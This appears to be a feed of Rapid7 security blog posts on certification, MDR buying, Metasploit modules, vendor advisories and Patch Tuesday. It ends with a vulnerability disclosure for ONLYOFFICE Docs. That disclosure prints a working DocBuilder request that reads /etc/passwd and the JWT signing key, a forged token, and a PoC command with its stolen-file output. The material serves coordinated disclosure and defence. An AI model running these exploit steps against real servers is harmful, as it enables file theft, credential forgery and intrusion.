item.title: Rapid7 Achieves ISO/IEC 42001 Certification for its AI Management System
item.description:
Exciting news for AI governance! Rapid7 has achieved ISO/IEC 42001:2023 certification for our Artificial Intelligence Management System (AIMS). The certificate was issued by Schellman Compliance, LLC, an ANAB accredited certification body, following an independent audit of how we govern the AI systems we develop in our role as an AI provider.

What is ISO/IEC 42001?

ISO/IEC 42001 is the first international management system standard for artificial intelligence. Where ISO/IEC 27001 focuses on information security, ISO/IEC 42001 focuses on how an organization governs AI. What exactly does “governing AI” mean?  Essentially, it means how AI risks and impacts are assessed, how data is managed, how systems are monitored once they’re in production, and how humans stay in the loop across the AI lifecycle.

This certification means an accredited third party has audited our AIMS and confirmed that it aligns to the standard. To note, this isn’t a one-time exercise, as the certification is maintained through annual surveillance audits. This means our AI governance program is held to the standard for as long as the certificate is active.

Why is ISO/IEC 42001 certification important?

AI is continually evolving how security teams work, and it’s also causing teams to reconsider the questions they ask their vendors. Where does the model come from? What data does it use? Who reviews its outputs? How do we maintain the integrity and quality of our AI products?

ISO/IEC 42001 certification gives customers independent evidence that Rapid7 has a management system in place to address those questions. It demonstrates that the in-scope AI systems are developed and operated under a structured program covering risk assessment, transparency, human oversight, and accountability.

It also supports customers in their own governance work. Many organizations are building AI risk into their third party risk programs and preparing for frameworks and regulations such as the NIST AI Risk Management Framework and the EU AI Act. A vendor's certified AIMS doesn't replace a customer's own due diligence, but it provides a credible, audited starting point.

As with cloud security, AI follows a shared responsibility model. Rapid7 is certified in the role of an AI provider, meaning we’re accountable for how we design, build, and operate these AI systems. Customers remain in control of how they use AI outputs within their own security operations.

Which AI systems are in scope?

The certification covers the AIMS supporting the following AI systems developed within Rapid7 products:

  • Agentic AI Workflow for MDR (Managed Detection and Response)

  • AI Dashboard Summary Card (Managed Detection and Response)

  • AI-Generated Risk Summaries (Exposure Command and Surface Command)

  • AI-Powered Log Search (Incident Command / InsightIDR)

  • AI-Powered Log Summary (Incident Command / InsightIDR)

  • Attack Surface Management (Surface Command)

  • ICS Runtime Event Story (InsightCloudSec / Cloud Runtime)

Most of these are capabilities customers use directly within the product. Agentic AI Workflow for MDR supports Rapid7's own SOC analysts as they investigate and respond on behalf of MDR customers.

What's next?

ISO/IEC 42001 certification joins Rapid7's existing security and compliance program, which includes ISO/IEC 27001, SOC 2, FedRAMP, IRAP, ENS, BSI C5, as well as U.S. and international cybersecurity regulations. Each is independently assessed against its own defined scope, with details available in the Rapid7 Trust Center (reach out to your Account Executive for access).

As our AI capabilities grow, our AI governance program will grow with them. As such, we'll update this post if the scope of certification changes.

Customers can request a copy of the certificate through their Account Executive or Rapid7 representative. The certificate can also be independently verified in Schellman's public certificate directory.

item.title: Gartner Report: The Attack Path is Closing Faster than Most Teams Can Patch
item.description:
Security teams have never lacked vulnerability data. The harder problem is deciding which issues create a credible path to business impact, then acting before that path can be used. As frontier AI makes it faster and less expensive to connect weaknesses, operational assumptions, and legitimate system behavior, that decision window is becoming even tighter.

The Gartner® report, Mythos Reprioritizes Cybersecurity Outcomes and Investments, examines what this shift means for cybersecurity priorities and investment. Rapid7 is offering complimentary access to the research, which we believe can help security leaders reassess how they prioritize exposure and infrastructure teams reassess how they plan response and recovery.

Why does AI change the vulnerability management equation?

Gartner states, “Mythos collapses the distance between theoretical weaknesses and executable attack scenarios, forcing cybersecurity to optimize for outcomes, not activity.” For leaders already managing more vulnerabilities than their teams can address, the pressure comes from the growing speed at which separate weaknesses can become a credible attack path.

The change also extends beyond one model. Gartner states, “By 2027, Mythos will be overtaken by new frontier-AI-enabled models, signaling that this moment is not about Mythos, but a new era of AI-assisted vulnerabilities and functional exploits.”

At Rapid7, we believe this requires a more attacker-aware view of exposure. A large backlog can contain thousands of issues with very different implications for the organization. Leaders need to understand which exposures are reachable, how they could be combined, which business services they affect, and what action would reduce risk most effectively.

What should security leaders measure instead?

Vulnerability counts, backlog size, and generic remediation targets show how much work a team has completed. They provide less clarity on whether an attacker’s options have narrowed or whether the organization can respond and recover more effectively.

Gartner advises, “Organizations must shift focus from volume and activity to speed of decision, effectiveness of response, and tangible reduction of enterprise risk in an environment where attacker reasoning scales rapidly.”

The report examines outcome-driven measures including “Attack path analysis coverage,” “Patching cadence,” “Compensating control deployment cadence,” “Mean time to remediate,” and “Technology debt.” We believe this gives leaders a stronger basis for connecting security investment with reduced exposure, faster action, and business resilience.

How can teams move from prioritization to action?

Better prioritization only creates value when teams can act on it. Gartner recommends, “Use attack path analysis to prioritize your patches, virtual patches, and compensating controls. This can scale down to a consideration of critical services mapped into critical business outcomes and exposure.”

Rapid7’s internal, practitioner-led exploration of Claude Mythos Preview through Project Glasswing reinforces our view that faster discovery is only the beginning. A model may help identify and validate a potential vulnerability, but reducing exposure still requires teams to understand affected systems, apply business context, choose the right remediation or compensating control, verify the result, and maintain detection coverage.

Rapid7’s vulnerability management capabilities support this operational path by bringing attack-surface visibility, threat intelligence, business context, and attack-path analysis together, helping teams identify which exposures matter most and coordinate remediation through existing workflows.

What does an outcome-led program look like?

An outcome-led program gives executives a clearer answer to a more useful question: which attacker opportunities did we reduce, and how quickly could we respond? It also supports ongoing decisions about technical debt, recovery planning, and where limited resources can deliver the greatest reduction in business risk.

item.title: Metasploit Wrapup: Unauth RCE modules in Network Perimeter Devices and much more
item.description:
Buckle up Metasploit-Framework enthusiasts because we have another action packed release for you. I'm talking, unauthenticated remote code execution modules in some of the biggest names in network perimeter devices like Citrix NetScaler and Cisco Secure Email Gateway. That's not all, we have an authenticated GitLab CI/CD regular expression integer overflow RCE module that was recently making head lines among many other awesome exploit modules. Looking for auxiliary modules? We've got you covered this release with a Flowise authentication bypass and a OpenBullet2 NTLMv2 hash disclosure, because who doesn't love collecting and cracking (or in some cases relaying) NTLM hashes am I right or am I right? In our continued effort to expand the payloads supported by the framework this week we saw fetch payload support for LoongArch. Lastly, if you're ever on an engagement or at home doing some testing and you see something that's not supported in Metasploit-Framework that you'd like to see supported, either drop us suggested-features issue on GitHub or trying throwing up a Pull Request, we'd love to hear from you. Happy hacking everyone!

New module content (13)

Flowise Authentication Bypass

Authors: Arthur Gervais, Isaac David, and Richard Howe

Type: Auxiliary

Pull request: #21757 contributed by rmhowe425

Path: admin/http/flowise_auth_bypass_cve_2025_58434

CVE reference: CVE-2025-58434

Description: Adds a new auxiliary module that exploits CVE-2025-58434, an unauthenticated account takeover in Flowise versions 3.0.5 and earlier. Flowise's password reset API returns a valid reset token directly in its response, so the module can reset the password of any account whose email address is known, with no credentials needed.

SPIP Password Change IDOR Privilege Escalation

Authors: 0xkidz and Julien Voisin

Type: Auxiliary

Pull request: #21865 contributed by jvoisin

Path: admin/http/spip_idor_password_reset

Description: This adds an auxiliary module which exploits a vulnerability in SPIP before 4.4.23 which allows attackers to change any user's password given a validly-signed POST without checking that the caller is authorized for that id_auteur. This issue was patched in 4.4.23 although no CVE has been assigned at the time of writing.

HashiCorp Consul Version Scanner

Author: h00die

Type: Auxiliary

Pull request: #22010 contributed by h00die

Path: scanner/http/hashicorp_consul_version

Description: Adds Hashicorp Consul version scanner.

OpenBullet2 NTLMv2 Hash Disclosure via UNC Path Proxy Source

Author: Maksim Rogov

Type: Auxiliary

Pull request: #21541 contributed by vognik

Path: scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908

CVE reference: CVE-2026-39908

Description: This adds two new modules targeting unauthenticated vulnerabilities in OpenBullet2. CVE-2026-25856: A Remote Code Execution (RCE) exploit that abuses the plain C# execution mode to run arbitrary .NET APIs and access the file system. CVE-2026-39908: A credential disclosure scanner for Windows that forces the app to reveal the NTLMv2 hash by loading a malicious UNC path. Both vulnerabilities affect OpenBullet2 releases starting from version 0.2.5.

Citrix NetScaler Unauthenticated Login Log Command Injection (CVE-2026-88771)

Authors: CERT-EU, Scyrix LLC, sfewer-r7, and watchTowr

Type: Exploit

Pull request: #21962 contributed by sfewer-r7

Path: freebsd/http/citrix_netscaler_cve_2026_88771

CVE reference: CVE-2026-88773

Description: This adds in an exploit module for the recent Citrix NetScaler unauth RCE via command injection (CVE-2026-88771), that was reported as being exploited in the wild by the vendor prior to public disclosure.

Portainer Authenticated Docker API Remote Root

Author: Aman Singh Gill (Gill-Singh-A)

Type: Exploit

Pull request: #21745 contributed by Gill-Singh-A

Path: linux/http/portainer_authenticated_docker_rce

Description: Adds an exploit module that uses valid Portainer credentials and access to a managed Docker environment to create a privileged container, bind-mount the host filesystem, and execute a native Linux or Unix command payload as root on the underlying Docker host. The module optionally pulls the required container image and removes temporary containers after payload execution.

Linux ELF Executable Payload Injection Persistence

Author: dledda-r7

Type: Exploit

Pull request: #21839 contributed by dledda-r7

Path: linux/persistence/elf

Description: This adds a new Linux ELF injector persistence module supporting x86, x64, and AArch64 architectures to enable payload injection and persistence. The tool uses code cave and segment injection techniques alongside architecture-specific trampolines to seamlessly preserve original execution flow.

GitLab CI/CD RegExp Integer Overflow Remote Code Execution

Authors: Jonah Burgess, jheysel-r7, and joaxcar

Type: Exploit

Pull request: #22017 contributed by jheysel-r7

Path: multi/http/gitlab_cicd_regexp_rce_cve_2026_97229

CVE reference: CVE-2026-97229

Description: Adds an exploit module for CVE-2026-97229, an integer overflow in GitLab’s CI/CD regular expression compiler that can lead to remote command execution as the git user. The module targets affected official GitLab CE/EE Linux amd64 releases, requires credentials with write access to a public project, and uses the unauthenticated CI lint API for payload delivery. Temporary branches and personal access tokens are automatically removed after exploitation.

OpenBullet2 Unauthenticated RCE via Config Configuration Interface

Author: Maksim Rogov

Type: Exploit

Pull request: #21541 contributed by vognik

Path: multi/http/openbullet2_unauth_rce_cve_2026_25856

CVE reference: CVE-2026-25856

Both vulnerabilities affect OpenBullet2 releases starting from version 0.2.5.

Cisco Secure Email Gateway S/MIME SQL Injection RCE

Author: sfewer-r7

Type: Exploit

Pull request: #22018 contributed by sfewer-r7

Path: unix/smtp/cisco_secure_email_gateway_smime_sqli_rce

CVE reference: CVE-2026-76443

Description: This module exploits a SQLi for unauthenticated RCE as root against Cisco Secure Email Gateway. The Cisco advisories are vague, however we have reason to believe this maps to CVE-2026-76443.

WordPress Bug Library Plugin Prior To 2.1.1 Unauthenticated PHP File Upload RCE

Authors: Bob Matyas and TrinityBerserker

item.title: Five Signs Your MDR is All Alert, No Action
item.description:
Your managed detection and response (MDR) provider flags suspicious activity, and your analyst spends the next hour finding the account, checking logs, and deciding whether anything needs to happen. By the time the investigation is underway, the alert feels less like help and more like a task assignment. 

MDR should bring your team capacity and expertise when it needs them. If the service keeps handing the hardest work back to your analysts, these five signs can help you work out where the arrangement is falling short.

1. Every alert arrives with homework

If your analysts are still sorting through the same recurring false positives, the extra coverage may be creating more work than it removes. Even an alert worth investigating is only so useful when your team has to gather the basic context before it can make a decision. Take a few recent alerts and look at what your provider had already checked when it contacted you. You should be able to see how it separated routine activity from a credible threat, and what it did to stop familiar noise from coming back.

2. It spots the fire, but cannot see the fuel

A suspicious login involving an account with broad access deserves a different response from the same activity on a tightly restricted account. The systems within reach, their importance to the business, and any known weaknesses all help determine what needs attention first. When your MDR leaves your team to assemble that picture during an investigation, valuable time goes into finding context that could have informed the response from the start. Find out how your provider uses information about assets, identities, vulnerabilities, and current threats, including what it can help you address before an incident occurs.

3. Your team gets incident updates, but few useful lessons

When a provider contains a threat and closes the case, your team should come away with more than a record of what happened. Consider the last significant investigation: did it lead to a clearer detection, a stronger response plan, or a better understanding of how an attacker moved through your environment? If similar activity appears three months later and your analysts have to work through the same questions, the service has missed a chance to make them better prepared. Expertise is most useful when your team can apply some of it next time.

4. Your response support has a spending limit

If an incident is still developing when your included response hours run out, continued specialist support may require another purchasing decision. Limits on hours, incident scope, or responder involvement can turn an agreed service into an unplanned budget request under pressure.

Ask what happens when an investigation expands across systems or continues longer than expected. Establish whether incident response is unlimited, which activities that includes, how long specialists stay involved, and what could trigger additional charges. When business operations and leadership confidence are already at stake, uncertainty about continued support adds financial and operational pressure at the point you need a clear path forward.

5. Your provider’s reports prove it was busy

A monthly report might show hundreds of alerts reviewed and dozens of investigations opened. That gives you a sense of volume, though it says little about what the provider found or did. Choose a closed investigation and follow it from the initial signal through to the outcome: what evidence was considered, what was ruled out, what action was taken, and when did your team become involved? item.title: Critical vulnerabilities in N-able N-central prompt hosted shutdown
item.description:
Overview

On November 9, 2026, N-able announced that it was responding to the public disclosure of critical vulnerabilities affecting N-central, its remote monitoring and management (RMM) platform.

In a public disclosure titled Able2Shell, an independent researcher has published details and proof-of-concept (PoC) code covering 33 issues. According to the disclosure, the issues include unauthenticated remote code execution (RCE), privilege escalation to root, credential disclosure, and unauthorized account creation. One unauthenticated chain combines XML external entity (XXE) and session-handling weaknesses to execute code as the nable service account. Other demonstrated chains involve an administrator viewing malicious patch metadata or use ProductAdmin credentials. Rapid7 Intelligence is currently triaging the newly published details.

Before the hotfix release on November 10, N-able reported scanning activity associated with the published PoC code and said it had no evidence that any customer environment had been successfully exploited. The vendor advised keeping N-central deployments offline while it developed and validated a hotfix. Hosted N-central classic environments were offline, according to the same notice. That notice did not yet include CVE identifiers or CVSS scores.

N-central is used by managed service providers (MSPs) and enterprise IT teams to administer endpoints and infrastructure. Compromise of an RMM server can put downstream managed environments at risk. N-central has previously been targeted through separate vulnerabilities, including an authentication bypass covered by Rapid7 in August 2026. Given the platform's administrative reach and the availability of public exploit code, Rapid7 recommends treating the current disclosure as an emergency.

Update #1: On November 10, 2026, N-able released N-central 2026.4 Hotfix 2 (build 2026.4.1.26), addressing seven CVEs. The vendor plans a follow-up hotfix with further security updates. On November 11, N-able confirmed that hosted N-central servers across all regions had been successfully upgraded.

Mitigation guidance

Rapid7 strongly recommends that organizations operating on-premises N-central servers upgrade to N-central 2026.4 Hotfix 2 (build 2026.4.1.26) on an emergency basis outside of normal patching cycles, and keep servers offline until successfully upgraded. Hosted servers are upgraded by N-able.

Customers in both hosted and on-premises environments must also upgrade their Agents and Probes. To maintain communication, upgrade Agents first, then Probes, following the vendor's compatibility guidance for the Patch Management Engine (PME).

  • Affected versions: The researcher reports testing N-central Appliance 2026.4.0.31. N-able's current notice does not specify the full affected-version range.

  • Fixed versions: N-central 2026.4 Hotfix 2 (build 2026.4.1.26) addresses the seven CVEs listed below.

According to N-able's release notes, the hotfix addresses:

CVE

Description

CVE-2026-125883

Multiple XXE vulnerabilities

CVE-2026-125878

Multiple OGNL injection vulnerabilities

CVE-2026-125879

Local privilege escalation to root through nable-writable syslog-ng configuration

CVE-2026-125880

Stored XSS through MMS3 patch metadata in an administrator context

CVE-2026-125881

Schema-hint SSRF through service-import schema validation

CVE-2026-125882

RCE through file-repository upload path traversal; credited to Nate Fair, Sprocket Security

CVE-2026-91000

Local privilege escalation through insecure IPC channels

Further security updates are planned in a follow-up hotfix. Organizations should monitor the vendor's guidance and apply subsequent fixes as they become available.

item.title: Patch Tuesday - November 2026
item.description:
Microsoft is publishing 1,092 own-product vulnerabilities on November 2026 Patch Tuesday, including 745 vulnerabilities in Windows. Until a few months ago, these volumes would have been unimaginable, but if anything, this month feels like a slight reprieve.

The jury is still out on whether patching many more vulnerabilities will lead to better security outcomes; every code change to resolve a known vulnerability could easily introduce new hidden treasure for researchers or threat actors to unearth in the future.

Despite the vast uptick in volume during 2026, there has been no accompanying increase in the number of vulnerabilities known to be exploited in the wild. Microsoft is aware of exploitation in the wild for just one of the vulnerabilities published today, with no known public disclosure at all this month.

Outlook: zero-day spoofing

Imagine coming home and checking your mailbox to find a postcard. You admire the non-specific image of a tropical beach at sunset, and flip it over to scan the handwriting on the back, which looks vaguely familiar. It’s addressed to you, but you can’t make out the signature, and the message is short and generic. Is that real handwriting, or has this been printed? Probably marketing material.

You put the card in the recycling and, since life is busy, you move on and forget about it. Somehow, you remain entirely unaware that, immediately after reading the postcard, you took out your phone and sent high-resolution images of your front door key to a number you’ve never contacted before.

Is this sketch just some rather questionable science fiction? Yes, hopefully, but what if that non-specific postcard was instead a malicious file in your Outlook inbox? Now we’re talking about CVE-2026-124194, an exploited-in-the-wild spoofing vulnerability. Merely opening a specially crafted malicious file causes Outlook to silently connect to an attacker-controlled location and leak the user’s NTLM v2 hash. All supported versions of classic Outlook receive patches.

The relatively low CVSS v3.1 base score of 6.5 does not tell the full story here, since this vulnerability provides value for both commodity attackers working to harvest initial access at scale, and also more targeted campaigns by more sophisticated threat actors.

The NTLM v2 hash can be relayed live to impersonate the user against another service, at least where those services do not implement adequate safeguards such as message signing for SMB or LDAP, as well as Extended Protection for Authentication for Exchange or Active Directory Certificate Services. Alternatively, the NTLM v2 hash can be cracked offline by a motivated attacker to retrieve the underlying credential. The Preview Pane is not a vector, which will help limit the real-world impact somewhat.

Windows Schannel: critical pre-auth RCE

A pre-authentication remote code execution (RCE) vulnerability in Windows will always attract attention. CVE-2026-119952 allows an attacker to execute code on a target system by sending specially crafted malicious packets. Since the vulnerable component is Schannel, which is Microsoft’s implementation of Transport Layer Security (TLS), attackers may not have to look very far to find vulnerable endpoints.

The advisory provides some comfort by pointing out that specific conditions are required for exploitability, which reduces the likelihood of broad exploitation, but the advisory still assesses exploitation as more likely, so Microsoft presumably expects that the development of reliable exploit code is feasible. In many cases, there will be no need for an attacker to have an existing foothold on the same subnet.

The execution context likely depends on the vulnerable service, which points to the evergreen need for least privilege architecture, but it also means that we cannot exclude the possibility of pre-auth RCE as SYSTEM in some cases.

Exchange/Windows Search: critical pre-auth RCE

Could someone take control of your Exchange server by sending a single email? In short: yes. Microsoft offers customers tight integration between various business-critical components. Exchange running on Windows is Microsoft on Microsoft, and the Windows Search component indexes email on behalf of Exchange.

An attacker aiming to exploit CVE-2026-116928 relies on this helpful synergy to achieve pre-auth RCE on the server by sending a malicious attachment, which Exchange will process automatically. How’s that for low attack complexity Although the advisory does not specify the context of execution, we should assume SYSTEM, since several of the services which might be involved do run with a high privilege level.

Since the patches are for Windows OS rather than Exchange itself, there’s no need to worry about which version of Exchange you’re running, so long as you are running only Exchange Subscription Edition, since all previous versions of Exchange are now fully beyond end of support.

Microsoft lifecycle update

There are fewer Microsoft product lifecycle changes in November 2026 than last month. As of Nov 11, 2026, .NET 8 Long Term Servicing channel moves past its release end date, along with PowerShell 7.4 LTS, and the 23H2 versions of the Enterprise, Education, and IoT editions of Windows 11.

item.title: MDR Pricing: Comparing Asset-Based and Ingestion-Based Costs
item.description:
When comparing MDR pricing, it helps to understand what the same annual budget would buy from each provider. Two proposals with similar prices may give analysts access to different evidence, retain it for different periods, or leave your team with different responsibilities. Those differences can affect what happens when you need to investigate a compromised account or trace an attacker’s low-and-slow activity across your environment.

For security leaders weighing asset-based against ingestion-based pricing, a useful comparison starts with the systems you need to protect and the logs required to investigate threats. Giving providers the same requirements and budget helps expose the decisions behind each quote, including what you would need to exclude or pay more to include.

Asset-based vs. ingestion-based MDR pricing

Under asset-based pricing, the charge is tied to a defined population of assets. You need to establish how the provider counts workstations, servers, cloud resources, and other systems, alongside which data sources and service capabilities the price includes. A predictable asset count can help with budgeting, but the proposal still needs to explain any integration limits or additional service charges. At Rapid7, an asset is defined as any physical or virtual endpoint or server running a supported operating system within the monitored environment.

With ingestion-based pricing, some of the cost depends on the volume of data collected or processed. The comparison needs to account for the included allowance, how billable volume is measured, and what happens when usage increases. Retention, search, and supporting infrastructure may also contribute to the overall cost, depending on the commercial model. At Rapid7, MDR customers have access to 13 months hot storage of logs as standard.

Whichever approach you are evaluating, include the technology, analysts, and response support needed to deliver the service. A SIEM ingestion charge on its own cannot be compared directly with an MDR subscription that includes investigation and response. Both proposals need to account for the work your organization expects the provider to perform - this clarity is key to a successful partnership.

How to make a like-for-like MDR pricing comparison

Give each provider the same asset inventory, required data sources, retention needs, and response expectations, then ask what fits within your annual budget. Any exclusions should be visible in the proposal, so you can judge their operational consequences before committing.

For example, one proposal might accommodate endpoint and identity data while requiring you to limit high-volume network sources. Another might accommodate those sources but lack an investigation capability your team needs. Looking at an MDR price per endpoint or per gigabyte will not resolve that difference; you need to see how the service uses the available data.

Use these questions during an initial demonstration to turn the pricing discussion into a practical comparison.

Comparison area

What to ask the provider

Evidence to request

Rapid7’s approach

Breadth of collection

Which required sources fit within this budget?

A list of included sources, exclusions, and extra charges.

Asset-based pricing with unlimited ingestion, supporting native and third-party telemetry across endpoint, cloud, identity, email, and network. Confirm coverage for your required sources in the proposal. 

Depth of collection

Which events and fields are collected, filtered, or summarized?

Sample records showing what reaches the investigation platform.

Rapid7 ingests and normalizes telemetry from supported technologies. Use the demonstration or proof of concept to verify which events and fields your integrations provide. 

Detection value

How does this data support the threats we need to detect?

A detection walkthrough showing its data dependencies.

Investigations combine security telemetry with vulnerability and asset-risk context. Completed threat hunts show the rationale, data examined, queries, and any linked investigations.

item.description:
Overview

As part of our research into Zimbra Collaboration Suite, Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container.

The findings also expose server files and document data that the viewer never displays, even when downloading is disabled.

CVE

Finding

CVSS

CVE-2026-113627

DocBuilder native file read and Session JWT forgery

7.1 High

CVE-2026-110385

DocBuilder SaveFile conversion parameter injection and code execution

8.7 High

CVE-2026-97727

Complete-save format path traversal and arbitrary file write

6.5 Medium

CVE-2026-113630

Root-helper command injection

7.8 High

CVE-2026-113631

View-only export of non-rendered document data

6.5 Medium

ONLYOFFICE confirmed on October 23, 2026 that all five findings were fixed in Document Server 10.0. The changelog describes the release's security changes.

Proof-of-concept code is available on the accompanying Github repository.

Product description

ONLYOFFICE Docs provides online viewers and editors for documents, spreadsheets, presentations, forms and PDFs. It supports collaborative editing and can integrate with applications that store and share files.

An integrating application, for example Zimbra Collaboration Suite, supplies an opening configuration identifying the document and the user's permissions, signed with the Browser key. This client-visible credential is referred to below as the Editor JWT. After opening a document, DocumentServer issues a Session JWT for reconnecting and saving.

Incoming service requests, including document-building jobs, are validated using ONLYOFFICE's Inbox JWT key. DocumentServer can also send generated document output to the integrating application's callback URL.

Credit

This assessment and the exploit-chain research were conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at Rapid7. The findings are being disclosed in accordance with Rapid7's vulnerability disclosure policy.

Testing setup

Rapid7 tested the official onlyoffice/documentserver:9.4.0 image with package onlyoffice-documentserver 9.4.0-129. DocumentServer ran as the ds account. JWT validation remained enabled, and no authentication check, private-address filter, or vendor code was disabled or modified. Browser and Inbox validation used the same effective signing key.

Our analysis of the vendor supplied fixes compares the v9.4.0.129 and v10.0.0.169 tags of ONLYOFFICE/server, ONLYOFFICE/core and ONLYOFFICE/document-server-package. Rapid7 also performed targeted checks on package 10.0.0-169. For the conditional WOPI test on 9.4.0-129, Rapid7 enabled only WOPI_ENABLED=true and left the shipped WOPI IP filter unchanged at its default allow-all rule.

Exploitation was demonstrated only on 9.4.0-129; the broader affected-version range is unknown.

Impact

View-only document access can lead to command execution as ds and then root inside the official container. The two exploit chains use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry.

Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed.

Editor JWT authorizes native file reads and session JWT forgery (CVE-2026-113627)

An attacker with view-only access to a document can use /docbuilder to steal files from the ONLYOFFICE server. In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer.

Technical analysis

Prerequisite: The attacker needs a valid Editor JWT for any document and access to /docbuilder. Target files must be readable by ds. The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required.

The default-secret branch in getTenantSecret() contains:

switch (type) {
case commonDefines.c_oAscSecretType.Browser:
case commonDefines.c_oAscSecretType.Inbox:
    res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key
break;
// ... other token types omitted ...
}

The branch at [0] selects the same configured signing key for Browser and Inbox tokens.

builderRequest() passes the request to getRequestParams():

const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation
if (authRes.isDecoded) {
  cmd.setWithAuthorization(true);
}

At [1], builderRequest() delegates JWT validation to getRequestParams(). That function's query-token branch checks the signature using the Inbox key:

if (tenTokenEnableRequestInbox) {
  res.code = constants.VKEY;
let checkJwtRes;
if (res.params.token) {
// [2] Inbox signature check
checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox);
  } else {
    checkJwtRes = yield checkJwtHeader(ctx, req);
  }
// ... remaining validation and decoded-claim handling omitted ...
}

A view-only Editor JWT passes the signature check at [2] because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder.

/docbuilder treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call GetFontBinary() with a supplied filename:

std::wstring sFile = file->toStringW();
bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/'));
if (bIsFullFilePath)
{
    bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check
}

// ... font-map fallback omitted ...

return CJSContext::createUint8Array(sFile); // [4] Return file bytes

GetFontBinary() accepts an existing absolute path at [3] and returns its bytes at [4]. Ssani4 previously reported this native file-read behavior in DocumentBuilder issue #147 on November 21, 2025. That report explicitly identified GetFontBinary() and ZipFileAsString() and used a Session JWT obtained from /downloadas to authorize /docbuilder. ONLYOFFICE closed the issue as fixed in DocumentBuilder 9.2.0.

Rapid7 reproduced GetFontBinary() file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains.

Exploitation

Reading a server file

The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The request fragment is:

POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1
Host: docs.example.test
Content-Type: application/octet-stream

builder.CreateFile("docx");
var bytes = native.GetFontBinary("/etc/passwd");
if (bytes === null || typeof bytes === "undefined") throw new Error("read failed");
var hex = "";
for (var i = 0; i < bytes.length; i++)
    hex += ("0" + bytes[i].toString(16)).slice(-2);
var paragraph = Api.CreateParagraph();
paragraph.AddText("R7FILE:" + hex + ":END");
Api.GetDocument().Push(paragraph);
builder.SaveFile("docx", "stolen.docx");
builder.CloseFile();

DocumentServer executes the script as ds and returns a URL for stolen.docx. The PoC downloads stolen.docx, extracts the hex between R7FILE: and :END from word/document.xml, and decodes it to recover the contents of /etc/passwd. Hex encoding supports binary files; the delimiters let the extractor locate the payload and reject output missing either boundary.

Stealing the session signing key

The attacker repeats the same request for /etc/onlyoffice/documentserver/local.json. In the tested configuration, services.CoAuthoring.secret.session.string contained the Session JWT signing key. If services.CoAuthoring.secret.session.file instead names a key file, the attacker reads that file with the same GetFontBinary() request.

Forging a save credential

The attacker chooses the document key, permissions and user ID, then signs the following claims with the stolen Session JWT key using HMAC-SHA256. For this save operation, the user ID does not need to correspond to an existing account:

{
  "document": {
    "key": "external-document-20260821",
    "permissions": {
      "download": true,
      "print": true
    }
  },
  "editorConfig": {
    "user": {
      "id": "rapid7-poc",
      "index": 1
    }
  },
  "iat": 1787329293,
  "exp": 1787329593
}

The attacker submits a normal SAVE_TYPE_PART_START request using the forged JWT and an attacker-chosen document key. DocumentServer returns a server-generated save key, proving that it accepts the forged credential and its ungranted document permissions.

PoC

The file-read and JWT-forgery PoC uses a view-only Editor JWT to read /etc/passwd, steal the Session JWT signing key and verify a forged token for an attacker-chosen document key:

python3 pocs/editor_token_docbuilder_jwt_forgery.py \
  --documentserver https://docs.example.test \
  --token-file /secure/view-only.jwt \
  --read-file /etc/passwd \
  --read-output /tmp/stolen-passwd \
  --document-key external-document-20260821 \
  --output-token /tmp/forged-session.jwt \
  --timeout 180

Output excerpt:

[+] read 1220 bytes from /etc/passwd to /tmp/stolen-passwd
[+] forged session JWT accepted for document key: external-document-20260821 (save key _7717)
[+] forged JWT written to: /tmp/forged-session.jwt
[+] forged JWT (expires at Unix time 1787329593):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb2N1bWVudCI6eyJrZXkiOiJleHRlcm5hbC1kb2N1bWVudC0yMDI2MDgyMSIsInBlcm1pc3Npb25zIjp7ImRvd25sb2FkIjp0cnVlLCJwcmludCI6dHJ1ZX19LCJlZGl0b3JDb25maWciOnsidXNlciI6eyJpZCI6InJhcGlkNy1wb2MiLCJpbmRleCI6MX19LCJpYXQiOjE3ODczMjkyOTMsImV4cCI6MTc4NzMyOTU5M30.VlXcl09_669zHtwiJFZDLFRtQbi_HTt7zncmPYUHLww

The file recovered to the attacker's machine contained the target's account data:

$ head -n 5 /tmp/stolen-passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

The JWT printed above was signed with the key recovered from local.json. DocumentServer accepted that signature during the normal save-key reservation:

{"status":"ok","data":"_7717"}

Impact

The attacker can steal any file readable by ds. On the tested system, this included the Session JWT signing key, allowing the attacker to create credentials with document keys and permissions that were never granted to the original viewer. DocumentServer accepted the forged JWT for a save operation under a new document key. The demonstrated unauthorized save accounts for the low integrity impact in the 7.1 High score.

The same editor-JWT authorization failure also allowed a view-only user to supply a private-network URL to Api.CreateImage(). DocumentServer fetched the URL and returned a decodable image inside a generated DOCX. This narrower consequence shares the authorization root cause above and is not treated as a separate finding.

Fix

In 10.0.0-169, builderRequest() now tells the token validator that this is a DocBuilder request:

-const authRes = yield docsCoServer.getRequestParams(ctx, req);
+authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER);

